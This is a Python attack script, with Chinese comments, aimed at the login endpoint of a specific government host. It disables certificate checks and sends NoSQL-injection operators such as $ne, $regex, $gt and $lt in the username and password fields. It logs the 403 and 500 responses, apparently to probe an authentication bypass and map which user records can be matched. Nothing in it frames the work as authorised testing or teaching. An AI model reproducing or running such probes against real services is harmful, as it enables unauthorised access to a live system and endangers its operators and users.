import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=12)
    try:
        r=s.post(BASE+"/login",json=body,timeout=12); return r.status_code, r.text
    except Exception as e: return None, repr(e)

print("=== password 条件 + $ne username (看 password 是否影响 403/500) ===")
pw_ops={
  "$ne None": {"$ne":None},
  "$ne null": {"$ne":None},
  "string admin": "admin",
  "$regex .": {"$regex":"."},
  "$in multi": {"$in":["a","b"]},
  "$eq x": {"$eq":"x"},
  "$exists": {"$exists":True},
}
for tag,pw in pw_ops.items():
    code,t=login({"username":{"$ne":None},"password":pw,"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    print(f"  password:{tag:16s} -> {code} {path}")
    time.sleep(0.08)

print("\n=== 换 username 为 $gt/$lt 不同范围 (控制匹配哪些用户) ===")
ranges={
  "$gt a": {"$gt":"a"},
  "$gt m": {"$gt":"m"},
  "$gt z": {"$gt":"z"},
  "$lt a": {"$lt":"a"},
  "$lt m": {"$lt":"m"},
  "$lt A": {"$lt":"A"},
  "$gt A": {"$gt":"A"},
  "$gte a": {"$gte":"a"},
}
for tag,r in ranges.items():
    code,t=login({"username":r,"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
    path="SOURCE-403" if code==403 else ("CRASH-500" if code==500 else f"{code}")
    print(f"  username:{tag:10s} -> {code} {path}")
    time.sleep(0.08)
print("DONE")
